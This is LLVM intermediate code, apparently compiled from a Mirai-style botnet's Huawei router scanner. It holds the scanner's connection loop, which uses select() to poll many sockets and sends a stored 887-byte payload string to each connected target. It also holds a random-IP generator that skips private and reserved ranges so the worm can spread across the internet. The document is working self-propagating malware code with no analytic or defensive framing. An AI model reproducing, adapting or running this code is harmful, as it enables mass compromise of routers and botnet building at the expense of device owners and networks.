  %392 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %393 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %392, i32 0, i32 2
  %394 = load i32, i32* %393, align 8
  %395 = icmp ne i32 %394, 0
  br i1 %395, label %396, label %416

396:                                              ; preds = %387
  %397 = load i32, i32* @huawei_fake_time, align 4
  %398 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %399 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %398, i32 0, i32 1
  %400 = load i32, i32* %399, align 4
  %401 = sub i32 %397, %400
  %402 = load i32, i32* %28, align 4
  %403 = icmp ugt i32 %401, %402
  br i1 %403, label %404, label %416

404:                                              ; preds = %396
  %405 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 8
  %408 = call i32 @close(i32 %407)
  %409 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %410 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %409, i32 0, i32 0
  store i32 -1, i32* %410, align 8
  %411 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %412 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %411, i32 0, i32 2
  store i32 0, i32* %412, align 8
  %413 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %414 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %413, i32 0, i32 6
  %415 = getelementptr inbounds [256 x i8], [256 x i8]* %414, i64 0, i64 0
  call void @util_zero(i8* %415, i32 256)
  br label %490

416:                                              ; preds = %396, %387
  %417 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %418 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %417, i32 0, i32 2
  %419 = load i32, i32* %418, align 8
  %420 = icmp eq i32 %419, 1
  br i1 %420, label %431, label %421

421:                                              ; preds = %416
  %422 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %423 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %422, i32 0, i32 2
  %424 = load i32, i32* %423, align 8
  %425 = icmp eq i32 %424, 3
  br i1 %425, label %431, label %426

426:                                              ; preds = %421
  %427 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %427, i32 0, i32 2
  %429 = load i32, i32* %428, align 8
  %430 = icmp eq i32 %429, 4
  br i1 %430, label %431, label %457

431:                                              ; preds = %426, %421, %416
  %432 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %433 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = srem i32 %434, 64
  %436 = zext i32 %435 to i64
  %437 = shl i64 1, %436
  %438 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %439 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %440 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 8
  %442 = sdiv i32 %441, 64
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds [16 x i64], [16 x i64]* %438, i64 0, i64 %443
  %445 = load i64, i64* %444, align 8
  %446 = or i64 %445, %437
  store i64 %446, i64* %444, align 8
  %447 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %448 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 8
  %450 = load i32, i32* %12, align 4
  %451 = icmp sgt i32 %449, %450
  br i1 %451, label %452, label %456

452:                                              ; preds = %431
  %453 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %454 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %453, i32 0, i32 0
  %455 = load i32, i32* %454, align 8
  store i32 %455, i32* %12, align 4
  br label %456

456:                                              ; preds = %452, %431
  br label %489

457:                                              ; preds = %426
  %458 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %458, i32 0, i32 2
  %460 = load i32, i32* %459, align 8
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %488

462:                                              ; preds = %457
  %463 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %464 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 8
  %466 = srem i32 %465, 64
  %467 = zext i32 %466 to i64
  %468 = shl i64 1, %467
  %469 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %470 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %471 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %470, i32 0, i32 0
  %472 = load i32, i32* %471, align 8
  %473 = sdiv i32 %472, 64
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds [16 x i64], [16 x i64]* %469, i64 0, i64 %474
  %476 = load i64, i64* %475, align 8
  %477 = or i64 %476, %468
  store i64 %477, i64* %475, align 8
  %478 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %479 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 8
  %481 = load i32, i32* %11, align 4
  %482 = icmp sgt i32 %480, %481
  br i1 %482, label %483, label %487

483:                                              ; preds = %462
  %484 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %484, i32 0, i32 0
  %486 = load i32, i32* %485, align 8
  store i32 %486, i32* %11, align 4
  br label %487

487:                                              ; preds = %483, %462
  br label %488

488:                                              ; preds = %487, %457
  br label %489

489:                                              ; preds = %488, %456
  br label %490

490:                                              ; preds = %489, %404
  %491 = load i32, i32* %1, align 4
  %492 = add nsw i32 %491, 1
  store i32 %492, i32* %1, align 4
  br label %384, !llvm.loop !14

493:                                              ; preds = %384
  %494 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %494, align 8
  %495 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %495, align 8
  %496 = load i32, i32* %12, align 4
  %497 = load i32, i32* %11, align 4
  %498 = icmp sgt i32 %496, %497
  br i1 %498, label %499, label %501

499:                                              ; preds = %493
  %500 = load i32, i32* %12, align 4
  br label %503

501:                                              ; preds = %493
  %502 = load i32, i32* %11, align 4
  br label %503

503:                                              ; preds = %501, %499
  %504 = phi i32 [ %500, %499 ], [ %502, %501 ]
  %505 = add nsw i32 1, %504
  %506 = call i32 @select(i32 %505, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %506, i32* %13, align 4
  %507 = call i64 @time(i64* null) #7
  %508 = trunc i64 %507 to i32
  store i32 %508, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %509

509:                                              ; preds = %727, %503
  %510 = load i32, i32* %1, align 4
  %511 = icmp slt i32 %510, 128
  br i1 %511, label %512, label %730

512:                                              ; preds = %509
  %513 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %514 = load i32, i32* %1, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %513, i64 %515
  store %struct.huawei_scanner_connection* %516, %struct.huawei_scanner_connection** %7, align 8
  %517 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %518 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 8
  %520 = icmp eq i32 %519, -1
  br i1 %520, label %521, label %522

521:                                              ; preds = %512
  br label %727

522:                                              ; preds = %512
  %523 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %524 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %525 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 8
  %527 = sdiv i32 %526, 64
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds [16 x i64], [16 x i64]* %523, i64 0, i64 %528
  %530 = load i64, i64* %529, align 8
  %531 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %532 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %531, i32 0, i32 0
  %533 = load i32, i32* %532, align 8
  %534 = srem i32 %533, 64
  %535 = zext i32 %534 to i64
  %536 = shl i64 1, %535
  %537 = and i64 %530, %536
  %538 = icmp ne i64 %537, 0
  br i1 %538, label %539, label %609

539:                                              ; preds = %522
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %540 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %541 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 8
  %543 = bitcast i32* %29 to i8*
  %544 = call i32 @getsockopt(i32 %542, i32 1, i32 4, i8* %543, i32* %31) #7
  store i32 %544, i32* %30, align 4
  %545 = load i32, i32* %29, align 4
  %546 = icmp eq i32 %545, 0
  br i1 %546, label %547, label %599

547:                                              ; preds = %539
  %548 = load i32, i32* %30, align 4
  %549 = icmp eq i32 %548, 0
  br i1 %549, label %550, label %599

550:                                              ; preds = %547
  %551 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %551, i32 0, i32 2
  %553 = load i32, i32* %552, align 8
  %554 = icmp eq i32 %553, 3
  br i1 %554, label %555, label %580

555:                                              ; preds = %550
  %556 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %557 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %556, i32 0, i32 8
  %558 = getelementptr inbounds [2560 x i8], [2560 x i8]* %557, i64 0, i64 0
  %559 = call i32 @util_strcpy(i8* %558, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str, i64 0, i64 0))
  %560 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %561 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %564 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %563, i32 0, i32 8
  %565 = getelementptr inbounds [2560 x i8], [2560 x i8]* %564, i64 0, i64 0
  %566 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %566, i32 0, i32 8
  %568 = getelementptr inbounds [2560 x i8], [2560 x i8]* %567, i64 0, i64 0
  %569 = call i32 @util_strlen(i8* %568)
  %570 = sext i32 %569 to i64
  %571 = call i64 @send(i32 %562, i8* %565, i64 %570, i32 16384)
  %572 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %573 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %572, i32 0, i32 8
  %574 = getelementptr inbounds [2560 x i8], [2560 x i8]* %573, i64 0, i64 0
  call void @util_zero(i8* %574, i32 2560)
  %575 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %576 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %575, i32 0, i32 6
  %577 = getelementptr inbounds [256 x i8], [256 x i8]* %576, i64 0, i64 0
  call void @util_zero(i8* %577, i32 256)
  %578 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %579 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %578, i32 0, i32 2
  store i32 4, i32* %579, align 8
  br label %727

580:                                              ; preds = %550
  %581 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %582 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %581, i32 0, i32 2
  %583 = load i32, i32* %582, align 8
  %584 = icmp eq i32 %583, 4
  br i1 %584, label %585, label %594

585:                                              ; preds = %580
  %586 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %587 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %586, i32 0, i32 0
  %588 = load i32, i32* %587, align 8
  %589 = call i32 @close(i32 %588)
  %590 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %590, i32 0, i32 0
  store i32 -1, i32* %591, align 8
  %592 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %593 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %592, i32 0, i32 2
  store i32 0, i32* %593, align 8
  br label %727

594:                                              ; preds = %580
  %595 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %596 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %595, i32 0, i32 2
  store i32 3, i32* %596, align 8
  br label %597

597:                                              ; preds = %594
  br label %598

598:                                              ; preds = %597
  br label %608

599:                                              ; preds = %547, %539
  %600 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %600, i32 0, i32 0
  %602 = load i32, i32* %601, align 8
  %603 = call i32 @close(i32 %602)
  %604 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %605 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %604, i32 0, i32 0
  store i32 -1, i32* %605, align 8
  %606 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %607 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %606, i32 0, i32 2
  store i32 0, i32* %607, align 8
  br label %727

608:                                              ; preds = %598
  br label %609

609:                                              ; preds = %608, %522
  %610 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %611 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %611, i32 0, i32 0
  %613 = load i32, i32* %612, align 8
  %614 = sdiv i32 %613, 64
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds [16 x i64], [16 x i64]* %610, i64 0, i64 %615
  %617 = load i64, i64* %616, align 8
  %618 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %618, i32 0, i32 0
  %620 = load i32, i32* %619, align 8
  %621 = srem i32 %620, 64
  %622 = zext i32 %621 to i64
  %623 = shl i64 1, %622
  %624 = and i64 %617, %623
  %625 = icmp ne i64 %624, 0
  br i1 %625, label %626, label %726

626:                                              ; preds = %609
  br label %627

627:                                              ; preds = %626, %688, %707
  store i32 0, i32* %32, align 4
  %628 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %628, i32 0, i32 2
  %630 = load i32, i32* %629, align 8
  %631 = icmp eq i32 %630, 0
  br i1 %631, label %632, label %633

632:                                              ; preds = %627
  br label %725

633:                                              ; preds = %627
  %634 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %634, i32 0, i32 5
  %636 = load i32, i32* %635, align 4
  %637 = icmp eq i32 %636, 256
  br i1 %637, label %638, label %650

638:                                              ; preds = %633
  %639 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %639, i32 0, i32 6
  %641 = getelementptr inbounds [256 x i8], [256 x i8]* %640, i64 0, i64 0
  %642 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %643 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %642, i32 0, i32 6
  %644 = getelementptr inbounds [256 x i8], [256 x i8]* %643, i64 0, i64 0
  %645 = getelementptr inbounds i8, i8* %644, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %641, i8* align 1 %645, i64 192, i1 false)
  %646 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %646, i32 0, i32 5
  %648 = load i32, i32* %647, align 4
  %649 = sub nsw i32 %648, 64
  store i32 %649, i32* %647, align 4
  br label %650

650:                                              ; preds = %638, %633
  %651 = call i32* @__errno_location() #9
  store i32 0, i32* %651, align 4
  %652 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %656 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %655, i32 0, i32 6
  %657 = getelementptr inbounds [256 x i8], [256 x i8]* %656, i64 0, i64 0
  %658 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %659 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %658, i32 0, i32 5
  %660 = load i32, i32* %659, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds i8, i8* %657, i64 %661
  %663 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %664 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %663, i32 0, i32 5
  %665 = load i32, i32* %664, align 4
  %666 = sub nsw i32 256, %665
  %667 = call i32 @huawei_recv_strip_null(i32 %654, i8* %662, i32 %666, i32 16384)
  store i32 %667, i32* %32, align 4
  %668 = load i32, i32* %32, align 4
  %669 = icmp eq i32 %668, 0
  br i1 %669, label %670, label %672

670:                                              ; preds = %650
  %671 = call i32* @__errno_location() #9
  store i32 104, i32* %671, align 4
  store i32 -1, i32* %32, align 4
  br label %672

672:                                              ; preds = %670, %650
  %673 = load i32, i32* %32, align 4
  %674 = icmp eq i32 %673, -1
  br i1 %674, label %675, label %707

675:                                              ; preds = %672
  %676 = call i32* @__errno_location() #9
  %677 = load i32, i32* %676, align 4
  %678 = icmp ne i32 %677, 11
  br i1 %678, label %679, label %706

679:                                              ; preds = %675
  %680 = call i32* @__errno_location() #9
  %681 = load i32, i32* %680, align 4
  %682 = icmp ne i32 %681, 11
  br i1 %682, label %683, label %706

683:                                              ; preds = %679
  %684 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %685 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %684, i32 0, i32 2
  %686 = load i32, i32* %685, align 8
  %687 = icmp eq i32 %686, 3
  br i1 %687, label %688, label %694

688:                                              ; preds = %683
  %689 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 8
  %692 = call i32 @close(i32 %691)
  %693 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.huawei_scanner_connection* %693)
  br label %627

694:                                              ; preds = %683
  %695 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %696 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 8
  %698 = call i32 @close(i32 %697)
  %699 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %699, i32 0, i32 0
  store i32 -1, i32* %700, align 8
  %701 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %702 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %701, i32 0, i32 2
  store i32 0, i32* %702, align 8
  %703 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %703, i32 0, i32 6
  %705 = getelementptr inbounds [256 x i8], [256 x i8]* %704, i64 0, i64 0
  call void @util_zero(i8* %705, i32 256)
  br label %706

706:                                              ; preds = %694, %679, %675
  br label %725

707:                                              ; preds = %672
  %708 = load i32, i32* %32, align 4
  %709 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %709, i32 0, i32 5
  %711 = load i32, i32* %710, align 4
  %712 = add nsw i32 %711, %708
  store i32 %712, i32* %710, align 4
  %713 = load i32, i32* @huawei_fake_time, align 4
  %714 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %715 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %714, i32 0, i32 1
  store i32 %713, i32* %715, align 4
  %716 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %717 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %716, i32 0, i32 6
  %718 = getelementptr inbounds [256 x i8], [256 x i8]* %717, i64 0, i64 0
  %719 = call i32 @util_strlen(i8* %718)
  store i32 %719, i32* %33, align 4
  %720 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %720, i32 0, i32 6
  %722 = load i32, i32* %33, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds [256 x i8], [256 x i8]* %721, i64 0, i64 %723
  store i8 0, i8* %724, align 1
  br label %627

725:                                              ; preds = %706, %632
  br label %726

726:                                              ; preds = %725, %609
  br label %727

727:                                              ; preds = %726, %599, %585, %555, %521
  %728 = load i32, i32* %1, align 4
  %729 = add nsw i32 %728, 1
  store i32 %729, i32* %1, align 4
  br label %509, !llvm.loop !15

730:                                              ; preds = %509
  br label %137
}

; Function Attrs: nounwind
declare i32 @fork() #2

declare i32 @util_local_addr() #1

declare void @rand_init() #1

; Function Attrs: nounwind
declare i64 @time(i64*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

declare i32 @close(i32) #1

declare i32 @rand_next() #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  br label %8

8:                                                ; preds = %165, %0
  %9 = call i32 @rand_next()
  store i32 %9, i32* %2, align 4
  %10 = call i64 @time(i64* null) #7
  %11 = trunc i64 %10 to i32
  call void @srand(i32 %11) #7
  %12 = load i32, i32* %2, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %2, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %2, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  %23 = load i32, i32* %2, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %6, align 1
  br label %27

27:                                               ; preds = %8
  %28 = load i8, i8* %3, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br i1 %30, label %165, label %31

31:                                               ; preds = %27
  %32 = load i8, i8* %3, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %165, label %35

35:                                               ; preds = %31
  %36 = load i8, i8* %3, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 3
  br i1 %38, label %165, label %39

39:                                               ; preds = %35
  %40 = load i8, i8* %3, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 15
  br i1 %42, label %165, label %43

43:                                               ; preds = %39
  %44 = load i8, i8* %3, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 16
  br i1 %46, label %165, label %47

47:                                               ; preds = %43
  %48 = load i8, i8* %3, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 56
  br i1 %50, label %165, label %51

51:                                               ; preds = %47
  %52 = load i8, i8* %3, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %165, label %55

55:                                               ; preds = %51
  %56 = load i8, i8* %3, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 192
  br i1 %58, label %59, label %63

59:                                               ; preds = %55
  %60 = load i8, i8* %4, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 168
  br i1 %62, label %165, label %63

63:                                               ; preds = %59, %55
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 172
  br i1 %66, label %67, label %75

67:                                               ; preds = %63
  %68 = load i8, i8* %4, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp sge i32 %69, 16
  br i1 %70, label %71, label %75

71:                                               ; preds = %67
  %72 = load i8, i8* %4, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %73, 32
  br i1 %74, label %165, label %75

75:                                               ; preds = %71, %67, %63
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 100
  br i1 %78, label %79, label %87

79:                                               ; preds = %75
  %80 = load i8, i8* %4, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  br i1 %82, label %83, label %87

83:                                               ; preds = %79
  %84 = load i8, i8* %4, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp slt i32 %85, 127
  br i1 %86, label %165, label %87

87:                                               ; preds = %83, %79, %75
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 169
  br i1 %90, label %91, label %95

91:                                               ; preds = %87
  %92 = load i8, i8* %4, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp sgt i32 %93, 254
  br i1 %94, label %165, label %95

95:                                               ; preds = %91, %87
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 198
  br i1 %98, label %99, label %107

99:                                               ; preds = %95
  %100 = load i8, i8* %4, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sge i32 %101, 18
  br i1 %102, label %103, label %107

103:                                              ; preds = %99
  %104 = load i8, i8* %4, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp slt i32 %105, 20
  br i1 %106, label %165, label %107

107:                                              ; preds = %103, %99, %95
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sge i32 %109, 224
  br i1 %110, label %165, label %111

